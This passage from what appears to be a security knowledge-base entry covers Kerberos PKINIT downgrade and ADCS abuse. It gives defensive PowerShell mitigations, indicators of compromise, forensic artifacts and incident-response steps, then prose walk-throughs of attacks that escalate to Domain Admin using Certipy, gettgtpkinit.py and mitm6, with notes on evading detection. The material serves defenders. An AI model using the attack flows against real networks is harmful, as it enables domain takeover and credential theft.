6. Apply changes

---

### Priority 2: HIGH

**Mitigation 4: Implement MITM Prevention (IPv6, DNS Hardening)**

- Deploy **DNSSEC** for DNS query authentication
- Disable **IPv6** on internal networks (or secure it properly)
- Enable **Router Advertisement Guard (RA Guard)** on network switches
- Block **LLMNR and NetBIOS** broadcasts

**Manual Steps (Disable IPv6):**
```powershell
# Disable IPv6 on network adapters
Get-NetAdapter | Set-NetAdapterBinding -ComponentID tcpip6 -Enabled $false

# Or via Group Policy:
# Computer Configuration → Policies → Windows Settings → Security Settings → Network Options
# Set "TCPIP6 Interface Binding" to "Disabled"
```

---

**Mitigation 5: Enable Strict KDC Certificate Validation**

**Manual Steps (Registry - Server 2022+):**
```powershell
# Enforce strict certificate validation on KDC
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters' `
  -Name StrictKdcValidation -Value 1

# Require certificate chain to NTAuth
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters' `
  -Name AllowNtAuthPolicyBypass -Value 2  # 2 = Enforced mode
```

---

**Mitigation 6: Monitor PKINIT Activity and Certificate Issuance**

**Manual Steps:**
1. Enable audit logging on ADCS certificate templates
2. Monitor Event 4768 (PATYPE = 15) for unusual accounts
3. Create alerts for:
   - PKINIT requests from non-standard clients
   - Multiple certificate requests for sensitive accounts
   - Certificates with weak validation chains

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- PFX files in unusual locations (Temp, Downloads, etc.)
- Certipy, PKINITtools, Rubeus executables on non-admin machines

**Registry:**
- `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\KerberosParameters` modifications

**Network:**
- Multiple AS-REQ to port 88 with varying encryption types (downgrade probes)
- Connections from Linux/non-Windows hosts to port 88

**Processes:**
- Python processes executing gettgtpkinit.py, certipy, PKINITtools
- Rubeus.exe executed outside normal admin workflows

---

### Forensic Artifacts

**Disk:**
- Security Event Log: Event 4768 with PATYPE=15, CertThumbprint entries
- ADCS logs: Certificate request/issuance events (c:\windows\system32\winevt\logs)
- PFX files or base64-encoded certificates in temp folders

**Memory:**
- LSASS dump may contain TGT session keys and PAC structures

**Cloud:**
- Azure AD sign-in logs: Certificate-based authentication from unexpected locations

---

### Response Procedures

**1. Isolate (0-5 minutes):**
```powershell
# Disable the compromised service account
Set-ADUser -Identity compromised_account -AccountNotDelegated $true
Disable-ADAccount -Identity compromised_account
```

**2. Collect Evidence (5-30 minutes):**
```powershell
# Export Event 4768 logs
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4768)]]" -MaxEvents 1000 | Export-Csv Evidence.csv
```

**3. Remediate:**
```powershell
# Invalidate all TGTs: Change KRBTGT password twice
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "$(New-Guid)" -AsPlainText -Force)
Start-Sleep -Seconds 86400  # Wait 24 hours for replication
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "$(New-Guid)" -AsPlainText -Force)

# Revoke compromised certificates
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CERT-001] ADCS Enumeration | Identify vulnerable certificate templates |
| **2** | **Initial Access / Privilege Escalation** | [ESC1/ESC3/ESC8] ADCS Template Abuse | Request certificate impersonating admin |
| **3** | **Credential Access** | **[CA-KERB-009] PKINIT Downgrade (Current)** | **Authenticate via certificate, exploit weak encryption** |
| **4** | **Lateral Movement** | [LM-Kerberos] Pass-the-Ticket | Use TGT for service ticket requests |
| **5** | **Persistence** | [PERSIST-Golden-Ticket] Golden Ticket | Create long-lived forged TGT for access |
| **6** | **Impact** | [IMPACT-DCSync] Credential Dumping | Extract hashes using obtained privileges |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: ESC1 + PKINIT Privilege Escalation

**Target:** Enterprise using ADCS with misconfigured WebServer template

**Attack Flow:**
1. Domain user (low privilege) discovers WebServer template allows "Supply in Request" SAN
2. Uses Certipy to request certificate as Domain Administrator
3. Uses gettgtpkinit.py to authenticate as Domain Admin via PKINIT
4. Extracts NTLM hash via UnPAC-the-hash
5. Gains full domain administrative access

**Impact:** Complete domain compromise

**Detection Evasion:** PKINIT TGT request appears legitimate (similar to smart card logon)

---

### Example 2: MITM Encryption Downgrade (CVE-2022-33647)

**Scenario:** Attacker positioned on network via DNS poisoning

**Attack Sequence:**
1. Attacker establishes MITM using mitm6 (IPv6 RA spoofing)
2. Intercepts client's AS-REQ to KDC
3. Modifies KDC's AS-REP to force RC4 encryption
4. Client re-authenticates with RC4 (weaker encryption)
5. Attacker extracts RC4 session key via cryptanalysis
6. Decrypts TGT and impersonates user

**Detection Evasion:** Appears as standard authentication failure + retry

---

## REFERENCES & AUTHORITATIVE SOURCES

- [RFC 8636 - PKINIT Algorithm Agility](https://datatracker.ietf.org/doc/rfc8636/)
- [RFC 4557 - PKINIT](https://www.rfc-editor.org/rfc/rfc4557.html)
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [PKINITtools GitHub](https://github.com/dirkjanm/PKINITtools)
- [CVE-2022-33679 Analysis - Horizon3](https://horizon3.ai/attack-research/attack-blogs/from-cve-2022-33679-to-unauthenticated-kerberoasting/)
- [Microsoft KB5057784 - NTAuth Validation](https://support.microsoft.com/en-us/topic/protections-for-cve-2025-26647-kerberos-authentication-5f5d753b-4023-4dd3-b7b7-c8b1049)
- [Synacktiv - MDI PKINIT Detection Evasion](https://synacktiv.com/publications/understanding-and-evading-microsoft-defender-for-identity-pkinit-detection)
- [Silverfort - CVE-2022-33679 & CVE-2022-33647 Analysis](https://www.silverfort.com/blog/technical-analysis-of-cve-2022-33679-and-cve-2022-33647-kerberos-vulnerabilities/)

---
